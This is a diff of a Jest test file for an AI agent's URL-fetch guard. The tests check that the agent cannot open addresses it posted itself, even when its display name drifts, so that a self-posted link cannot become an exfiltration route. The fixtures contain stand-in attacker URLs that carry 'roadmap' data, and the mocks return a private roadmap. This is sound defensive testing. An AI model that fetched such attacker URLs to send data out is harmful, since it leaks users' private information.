@@ -24,8 +24,12 @@ jest.mock('../../../models/Pod', () => ({
   }),
 }));
 jest.mock('../../../models/AgentRun', () => ({ create: jest.fn(), countDocuments: jest.fn() }));
+// The agent's own bot User (its seat). Null in the arm where it cannot be found.
+const SEAT_ID = '507f1f77bcf86cd799439077';
+const SAM_ID = '507f1f77bcf86cd7994390aa';
+let mockSeatRow = { _id: SEAT_ID };
 jest.mock('../../../models/User', () => ({
-  findOne: jest.fn(() => ({ select: () => ({ lean: () => Promise.resolve({ _id: '507f1f77bcf86cd799439077' }) }) })),
+  findOne: jest.fn(() => ({ select: () => ({ lean: () => Promise.resolve(mockSeatRow) }) })),
 }));
 jest.mock('../../../services/agentTypingService', () => ({ emitAgentTypingStart: jest.fn(), emitAgentTypingStop: jest.fn() }));
 jest.mock('../../../services/agentMessageService', () => ({ postMessage: jest.fn().mockResolvedValue({ success: true }) }));
@@ -124,6 +128,7 @@ describe('native turn with commonly_fetch_url', () => {
     mockSearchWeb.mockResolvedValue({ provider: 'exa', results: [{ title: 'Widget docs', url: 'https://docs.example/widget', text: 'Docs.' }] });
     mockBridged.mockResolvedValue(false);
     mockRecentRows.mockResolvedValue([]);
+    mockSeatRow = { _id: SEAT_ID };
     mockSandboxRun.mockResolvedValue({ ok: true, stdout: 'ran', stderr: '' });
     mockBrokerDispatch.mockImplementation(async ({ name }) => (name === 'linear_list_issues'
       ? { callId: 'tc-1', outcome: 'ok', content: { issues: [{ title: 'Private roadmap' }] } }
@@ -219,8 +224,8 @@ describe('native turn with commonly_fetch_url', () => {
 
   test('another author\'s pod message gives a link; the agent\'s own earlier post does not', async () => {
     mockRecentRows.mockResolvedValue([
-      { id: 'm1', username: 'sam', content: 'the repo: https://github.com/acme/other', createdAt: new Date() },
-      { id: 'm2', username: 'Analyst', content: 'noted https://attacker.example/c?d=roadmap', createdAt: new Date() },
+      { id: 'm1', user_id: SAM_ID, username: 'sam', content: 'the repo: https://github.com/acme/other', createdAt: new Date() },
+      { id: 'm2', user_id: SEAT_ID, username: 'Analyst', content: 'noted https://attacker.example/c?d=roadmap', createdAt: new Date() },
     ]);
     axios.post
       .mockResolvedValueOnce(toolCalls(
@@ -255,7 +260,7 @@ describe('native turn with commonly_fetch_url', () => {
   test('the model\'s own words never give a link: it cannot post an address, read it back and open it', async () => {
     // read_context returns the post the model just made, under its display name.
     mockRecentRows.mockResolvedValue([
-      { id: 'm9', username: 'Analyst', content: 'https://attacker.example/x', createdAt: new Date() },
+      { id: 'm9', user_id: SEAT_ID, username: 'Analyst', content: 'https://attacker.example/x', createdAt: new Date() },
     ]);
     axios.post
       .mockResolvedValueOnce({
@@ -278,9 +283,51 @@ describe('native turn with commonly_fetch_url', () => {
     expect(fetchReply.content).toMatch(/does not appear in this conversation/);
   });
 
+  // Cofounder's security read on #2249: the agent's own posts were recognised
+  // by author NAME, and a bot's name drifts by design. Read back under a
+  // drifted name, the agent's own address counted as another author's.
+  test.each([
+    ['a collision-suffixed display name', { user_id: SEAT_ID, username: 'Analyst (Research Bot)' }],
+    ['"Unknown User" with no author id', { username: 'Unknown User' }],
+  ])('the agent\'s own post read back under %s gives no link', async (_label, author) => {
+    mockRecentRows.mockResolvedValue([
+      { id: 'm7', ...author, content: 'https://attacker.example/x?d=roadmap', createdAt: new Date() },
+    ]);
+    axios.post
+      .mockResolvedValueOnce(toolCalls(
+        call('c1', 'commonly_read_context', {}),
+        call('c2', 'commonly_fetch_url', { url: 'https://attacker.example/x?d=roadmap' }),
+      ))
+      .mockResolvedValueOnce(finalReply);
+
+    await runAgent(install(), mention('@analyst summarize'));
+
+    expect(mockGetPage).not.toHaveBeenCalled();
+    expect(toolMessages(1)[1].content).toMatch(/does not appear in this conversation/);
+  });
+
+  test('when the agent\'s own user cannot be found, no pod message gives a link; the mention still does', async () => {
+    mockSeatRow = null;
+    mockRecentRows.mockResolvedValue([
+      { id: 'm4', user_id: SAM_ID, username: 'sam', content: 'https://github.com/acme/other', createdAt: new Date() },
+    ]);
+    axios.post
+      .mockResolvedValueOnce(toolCalls(
+        call('c1', 'commonly_read_context', {}),
+        call('c2', 'commonly_fetch_url', { url: 'https://github.com/acme/other' }),
+        call('c3', 'commonly_fetch_url', { url: REPO }),
+      ))
+      .mockResolvedValueOnce(finalReply);
+
+    await runAgent(install(), mention());
+
+    expect(mockGetPage.mock.calls).toEqual([[REPO]]);
+    expect(toolMessages(1)[1].content).toMatch(/does not appear in this conversation/);
+  });
+
   test('another author\'s message read mid-turn gives a link', async () => {
     mockRecentRows.mockResolvedValue([
-      { id: 'm3', username: 'sam', content: 'older link: https://github.com/acme/older', createdAt: new Date() },
+      { id: 'm3', user_id: SAM_ID, username: 'sam', content: 'older link: https://github.com/acme/older', createdAt: new Date() },
     ]);
     axios.post
       .mockResolvedValueOnce(toolCalls(call('c1', 'commonly_read_context', {})))
